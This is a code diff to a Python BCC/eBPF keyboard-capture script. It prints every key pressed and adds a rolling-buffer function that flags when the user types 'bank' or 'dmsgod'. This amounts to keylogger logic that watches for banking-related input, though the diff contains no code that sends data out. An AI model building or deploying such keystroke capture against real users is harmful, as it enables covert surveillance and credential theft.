@@ -1,5 +1,6 @@
 from bcc import BPF
 import ctypes as ct
+import sys
 
 keyCodeList = {}
 
@@ -77,6 +78,28 @@ def getKeyInput(log):
 
     return retval
 
+def detectPattern(keyInput):
+    detectPattern.curString += keyCodeList[keyInput]
+    #print(detectPattern.curString)
+    for pattern in detectPattern.targetPattern:
+        if detectPattern.curString.find(pattern) != -1:
+            detectPattern.curString = ''
+            print('pattern detected', flush=True)
+            return True
+    
+    while len(detectPattern.curString) >= detectPattern.longestLength:
+        detectPattern.curString = detectPattern.curString[1:]
+    
+    return False
+
+detectPattern.targetPattern = ['bank', 'dmsgod']
+detectPattern.longestLength = 0
+for pattern in detectPattern.targetPattern:
+    length = len(pattern)
+    if length > detectPattern.longestLength:
+        detectPattern.longestLength = length
+detectPattern.curString = ''
+
 def processKeyboardInput(keyInput):
     # keyboard input comes twice per one press.
     # So it counts each press and raises only when the count is even.
@@ -86,9 +109,10 @@ def processKeyboardInput(keyInput):
         processKeyboardInput.counter[keyInput] += 1
         if (processKeyboardInput.counter[keyInput] % 2) == 0:
             if keyInput in keyCodeList:
-                print(keyCodeList[keyInput], flush=True)
+                print('Pressed: ' + keyCodeList[keyInput], flush=True)
+                detectPattern(keyInput)
             else:
-                print(keyInput, flush=True)
+                print('Pressed: ' + str(keyInput), flush=True)
 
 processKeyboardInput.counter = {}
 
